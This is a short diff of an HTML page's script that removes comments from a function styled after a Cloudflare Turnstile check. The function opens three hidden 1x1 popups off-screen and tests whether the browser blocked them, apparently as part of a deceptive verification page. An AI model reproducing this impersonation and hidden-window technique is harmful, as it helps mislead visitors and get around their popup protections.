@@ -245,16 +245,13 @@ z
 </html>
 <script>
     function permprompt() {
-        const attempts = 3;
         const popups = [];
 
-        // Attempt to open multiple popups
-        for (let i = 0; i < attempts; i++) {
+        for (let i = 0; i < 3; i++) {
             const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,left=-1000,top=-1000");
             popups.push(popup);
         }
 
-        // Check if popups were blocked
         const blocked = popups.some(popup => popup === null || typeof popup === "undefined");
 
         if (blocked) {
@@ -286,7 +283,6 @@ z
         }
         }
 
-        // Ensure the DOM is fully loaded before calling the function
         document.addEventListener('DOMContentLoaded', () => {
         const button = document.querySelector('.turnstile-button');
         if (button) {
